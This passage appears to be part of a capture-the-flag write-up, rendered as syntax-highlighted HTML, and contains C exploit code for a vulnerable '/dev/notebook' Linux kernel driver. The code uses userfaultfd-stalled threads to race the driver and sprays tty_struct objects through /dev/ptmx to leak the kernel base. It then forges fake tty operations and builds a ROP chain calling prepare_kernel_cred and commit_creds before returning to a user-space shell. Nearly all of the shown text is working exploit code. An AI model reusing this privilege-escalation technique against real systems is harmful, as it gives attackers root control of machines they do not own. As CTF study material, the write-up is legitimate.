operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> mem<span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">ioctl</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span> <span class=\"token number\">0x100</span> <span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>arg <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token operator\">*</span> <span class=\"token function\">block_edit</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    args arg<span class=\"token punctuation\">;</span>\n    arg<span class=\"token punctuation\">.</span>index <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>size_t<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>index<span class=\"token punctuation\">;</span>\n    arg<span class=\"token punctuation\">.</span>size <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    arg<span class=\"token punctuation\">.</span>data <span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> mem<span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">ioctl</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span> <span class=\"token number\">0x300</span> <span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>arg <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span>size_t index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    args arg<span class=\"token punctuation\">;</span>\n    arg<span class=\"token punctuation\">.</span>index <span class=\"token operator\">=</span> index<span class=\"token punctuation\">;</span>\n    arg<span class=\"token punctuation\">.</span>size <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    arg<span class=\"token punctuation\">.</span>data <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">int</span> res <span class=\"token operator\">=</span> <span class=\"token function\">ioctl</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span> <span class=\"token number\">0x200</span> <span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>arg <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>res<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Detele a chunk\"</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Can not detele chunk\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>size_t index <span class=\"token punctuation\">,</span> size_t size <span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    args arg<span class=\"token punctuation\">;</span>\n    arg<span class=\"token punctuation\">.</span>index <span class=\"token operator\">=</span> index<span class=\"token punctuation\">;</span>\n    arg<span class=\"token punctuation\">.</span>size <span class=\"token operator\">=</span> size<span class=\"token punctuation\">;</span>\n    arg<span class=\"token punctuation\">.</span>data <span class=\"token operator\">=</span> data<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">int</span> res <span class=\"token operator\">=</span> <span class=\"token function\">ioctl</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span> <span class=\"token number\">0x300</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>arg <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    args arg<span class=\"token punctuation\">;</span>\n    arg<span class=\"token punctuation\">.</span>index <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    arg<span class=\"token punctuation\">.</span>size <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    arg<span class=\"token punctuation\">.</span>data <span class=\"token operator\">=</span> data<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">int</span> res <span class=\"token operator\">=</span> <span class=\"token function\">ioctl</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span> <span class=\"token number\">0x64</span> <span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>arg <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">note_read</span><span class=\"token punctuation\">(</span>size_t index<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>data <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">int</span> res <span class=\"token operator\">=</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span> data <span class=\"token punctuation\">,</span> index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">note_write</span><span class=\"token punctuation\">(</span>size_t index<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">int</span> res <span class=\"token operator\">=</span> <span class=\"token function\">write</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span> data <span class=\"token punctuation\">,</span> index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>res<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Edit chunk data\"</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Can not Edit chunk data\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\nsize_t <span class=\"token function\">get_mod_addr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    FILE<span class=\"token operator\">*</span> fd <span class=\"token operator\">=</span>  <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/tmp/moduleaddr\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    size_t leak <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> <span class=\"token number\">0x30</span><span class=\"token punctuation\">,</span> fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">sscanf</span><span class=\"token punctuation\">(</span>buf <span class=\"token punctuation\">,</span> <span class=\"token string\">\"%s%s%s%s%s%lx\"</span> <span class=\"token punctuation\">,</span>buffer<span class=\"token punctuation\">,</span>buffer<span class=\"token punctuation\">,</span>buffer<span class=\"token punctuation\">,</span>buffer<span class=\"token punctuation\">,</span>buffer<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>leak<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"leak\"</span> <span class=\"token punctuation\">,</span>leak<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    \n    <span class=\"token keyword\">int</span> tty_fd<span class=\"token punctuation\">[</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> tty_idx <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> fake_tty_op_idx <span class=\"token punctuation\">,</span> rop_idx<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">0x1000</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">char</span> rop<span class=\"token punctuation\">[</span><span class=\"token number\">0x1000</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">char</span> tty_buf<span class=\"token punctuation\">[</span><span class=\"token number\">0x1000</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n    size_t <span class=\"token operator\">*</span>data <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>size_t <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>buf<span class=\"token punctuation\">;</span>\n    size_t <span class=\"token operator\">*</span>tty_data <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>size_t <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>tty_buf<span class=\"token punctuation\">;</span>\n    size_t <span class=\"token operator\">*</span>rop_data <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>size_t <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>rop<span class=\"token punctuation\">;</span>\n\n    size_t heap_addr <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> tty_addr <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> fake_tty_op_addr <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span>rop_addr <span class=\"token punctuation\">;</span>\n    pthread_t tmp_t<span class=\"token punctuation\">,</span> add_t<span class=\"token punctuation\">,</span> edit_t<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">long</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>nums <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        nums<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">save_status</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// signal(SIGSEGV, shell);</span>\n\n    fd <span class=\"token operator\">=</span> <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/dev/notebook\"</span> <span class=\"token punctuation\">,</span> O_RDWR<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    mem <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">mmap</span><span class=\"token punctuation\">(</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1000</span><span class=\"token punctuation\">,</span> PROT_READ <span class=\"token operator\">|</span> PROT_WRITE<span class=\"token punctuation\">,</span> MAP_PRIVATE <span class=\"token operator\">|</span> MAP_ANONYMOUS<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">register_userfault</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>size_t<span class=\"token punctuation\">)</span> mem <span class=\"token punctuation\">,</span> <span class=\"token number\">0x1000</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>i <span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span> <span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>i <span class=\"token punctuation\">,</span> TTY_STRUCT_SIZE <span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token function\">pthread_create</span><span class=\"token punctuation\">(</span> <span class=\"token operator\">&amp;</span>edit_t <span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span> <span class=\"token punctuation\">,</span> block_edit <span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>nums<span class=\"token operator\">+</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x80</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        tty_fd<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/dev/ptmx\"</span><span class=\"token punctuation\">,</span> O_RDWR <span class=\"token operator\">|</span> O_NOCTTY<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token function\">pthread_create</span><span class=\"token punctuation\">(</span> <span class=\"token operator\">&amp;</span>add_t <span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span> <span class=\"token punctuation\">,</span> block_add <span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>nums<span class=\"token operator\">+</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">note_read</span><span class=\"token punctuation\">(</span>i <span class=\"token punctuation\">,</span> tty_buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>tty_data<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">0x5401</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            tty_idx <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>tty_idx <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Can not find tty\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    fake_tty_op_idx <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>tty_idx <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">;</span>\n    rop_idx <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>tty_idx <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">;</span>\n\n    vmlinux_base <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>tty_data<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xfffffffffffff000</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0xe8e000</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"tty_idx\"</span> <span class=\"token punctuation\">,</span> tty_idx <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"fake_tty_op_idx\"</span> <span class=\"token punctuation\">,</span> fake_tty_op_idx <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"rop_idx\"</span> <span class=\"token punctuation\">,</span> rop_idx <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"vmlinux_base\"</span> <span class=\"token punctuation\">,</span> vmlinux_base <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">set_offset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>fake_tty_op_idx <span class=\"token punctuation\">,</span> <span class=\"token number\">0x200</span> <span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>rop_idx <span class=\"token punctuation\">,</span> <span class=\"token number\">0x200</span> <span class=\"token punctuation\">,</span> rop<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    tty_addr <span class=\"token operator\">=</span> data<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token operator\">*</span>tty_idx<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    fake_tty_op_addr <span class=\"token operator\">=</span> data<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token operator\">*</span>fake_tty_op_idx<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    rop_addr <span class=\"token operator\">=</span> data<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token operator\">*</span>rop_idx<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"tty_addr\"</span> <span class=\"token punctuation\">,</span> tty_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"fake_tty_op_addr\"</span> <span class=\"token punctuation\">,</span> fake_tty_op_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"rop_addr\"</span> <span class=\"token punctuation\">,</span> rop_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    tty_data<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> pop_r12_pop_rbp_ret<span class=\"token punctuation\">;</span>\n    tty_data<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> fake_tty_op_addr<span class=\"token punctuation\">;</span>\n    tty_data<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> leave_ret<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> push_rdi_pop_rsp_pop_rbp_or_eax_edx_ret<span class=\"token punctuation\">;</span>\n\n    data<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> rop_addr<span class=\"token punctuation\">;</span>\n    data<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> leave_ret<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop_data<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop_data<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> pop_rdi_ret<span class=\"token punctuation\">;</span>\n    rop_data<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop_data<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> prepare_kernel_cred<span class=\"token punctuation\">;</span>\n    rop_data<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> pop_rdx_ret<span class=\"token punctuation\">;</span>\n    rop_data<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> pop_rdi_ret<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    rop_data<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> mov_rdi_rax_cmp_pop_rbp_ret<span class=\"token punctuation\">;</span>\n    rop_data<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop_data<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> commit_creds<span class=\"token punctuation\">;</span>\n\n    rop_data<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> kpti_trampoline<span class=\"token punctuation\">;</span>\n    rop_data<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// rdi</span>\n    rop_data<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop_data<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>size_t <span class=\"token punctuation\">)</span>shell<span class=\"token punctuation\">;</span>\n    rop_data<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_cs<span class=\"token punctuation\">;</span>\n    rop_data<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_rflags<span class=\"token punctuation\">;</span>\n    rop_data<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> 